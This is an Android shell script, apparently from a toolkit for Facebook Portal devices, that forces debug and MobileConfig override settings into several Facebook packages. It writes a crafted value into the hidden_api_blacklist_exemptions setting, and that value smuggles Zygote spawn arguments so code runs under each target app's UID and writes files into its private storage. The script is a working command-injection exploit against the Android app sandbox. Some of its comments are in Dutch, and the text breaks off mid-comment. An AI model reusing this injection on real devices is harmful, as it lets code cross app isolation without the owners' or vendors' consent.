#!/system/bin/sh
set -euo pipefail

# Each package that fetches its own MobileConfig (instead of proxying through
# another package) needs enable_mc_prefs set to enable the overrides GUI.
# com.facebook.aloha.system.services additionally needs aloha_debug_settings
# set to show the "Debug (Internal)" settings pane.
OVERRIDES_SYSTEM='{"1512:android_aloha_device":["15: aloha_debug_settings: true"],"20676:portal_mobileconfig":["4: enable_mc_prefs: true"],"_qe_overrides_":[]}'
OVERRIDES_OTHER='{"20676:portal_mobileconfig":["4: enable_mc_prefs: true"],"_qe_overrides_":[]}'

STATUS_FILE='/data/local/tmp/portal-toolkit-status'
PACKAGE_LIST=$(pm list packages -U)

# Usage: install_overrides package overrides
install_overrides() {
	# Pretty ugly way to get the UID, but I can't find a simpler one.
	local uid=$(echo "$PACKAGE_LIST" | sed -n "s/^package:$1 uid://p")
	test -n "$uid" || (echo "Can't find UID for $1" ; false)

	# Base64-encode the file contents to ensure payload has no commas.
	local b64=$(echo "$2" | base64 -w 0)

	echo -n "Overriding $1... "

	# Gebruik printf om de payload op te bouwen zonder fysieke enters in de broncode.
	# Dit voorkomt syntax errors wanneer het script via curl/pipe wordt uitgevoerd.
	local payload
	payload=$(printf '\n7\n--runtime-args\n--setuid=%s\n--setgid=%s\n--runtime-flags=1\n--seinfo=default\n--invoke-with\nf() { test $1 = /system/bin/app_process64 && echo %s | /system/bin/base64 -d >/data/user/0/%s/files/mobileconfig/mc_overrides.json && echo %s >%s ; }; f' "$uid" "$uid" "$b64" "$1" "$1" "$STATUS_FILE")

	settings put global hidden_api_blacklist_exemptions "$payload"

	# Unpersist, since we only need to run the payload once.
	settings delete global hidden_api_blacklist_exemptions >/dev/null

	# Wait for it to run.
	sleep 0.5

	if test "$(cat "$STATUS_FILE")" = "$1" ; then
		truncate -s 0 "$STATUS_FILE"
		echo "success"
	else
		truncate -s 0 "$STATUS_FILE"
		echo "failed"
		false
	fi
}

cleanup() {
	rm "$STATUS_FILE"
	echo "Done. Rebooting to restore Zygote function and apply changes..."
	reboot
}

rm -f "$STATUS_FILE"
touch "$STATUS_FILE"
chmod a+w "$STATUS_FILE"
trap cleanup EXIT

# 1. Essentiële systeem services (voor het
